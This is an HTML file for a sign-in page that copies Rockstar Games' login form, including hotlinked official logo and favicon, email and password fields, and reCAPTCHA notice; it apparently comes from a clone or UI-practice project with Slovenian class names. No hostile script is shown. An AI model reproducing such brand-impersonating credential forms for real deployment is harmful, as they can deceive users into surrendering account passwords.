<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In - Rockstar Games</title>

    <link rel="stylesheet" href="../styles/login-styles.css">
	<script src="../js/login.js"></script>
    <link rel="icon" href="https://s.rsg.sc/auth/rockstar.ico">
</head>

<body>

    <div class="stran-vsebina">
      
        <div class="logo-okvir">
            <img src="https://s.rsg.sc/auth/images/logo_20231030.svg"
                 alt="Rockstar Games Logotip"
                 class="logo-slika">
        </div>
      
        <div class="kartica-splosno" id="kartica-login">

            <h2 class="login-naslov">Sign In</h2>
			<div id="login-error-box" class="login-error-box" style="display: none;"></div>
           
            <div class="floating-group">
                <input type="email" id="login-email" class="floating-input" placeholder=" ">
                <label for="login-email" class="floating-label">Email</label>
            </div>
			<div id="error-email" class="field-error-text"></div>
          
            <div class="floating-group geslo-skupina">
                <input type="password" id="login-password" class="floating-input" placeholder=" ">
                <label for="login-password" class="floating-label">Password</label>    
            </div>
			<div id="error-password" class="field-error-text"></div>
          
            <label class="checkbox-vrstica">
                <input type="checkbox" id="keep-signed">
                Keep me signed in
            </label>

            
            <a href="#" class="pozabljeno-geslo">Forgot your password?</a>        
            <button type="button" class="gumb-next login-gumb">Sign in</button>
            
            <p class="recaptcha-login">
                This site is protected by reCAPTCHA Enterprise and the Google
                <a href="#">Privacy Policy</a> and <a href="#">Terms of Service</a> apply.
            </p>

        </div>
       
        <div class="prijava-tekst-zunaj login-bottom-link">
            Don't have a Rockstar Games account? 
            <a href="index.html" class="prijava-link-zunaj">Create a new account</a>
        </div>

    </div>

        </ul>
    </div>

</body>
</html>
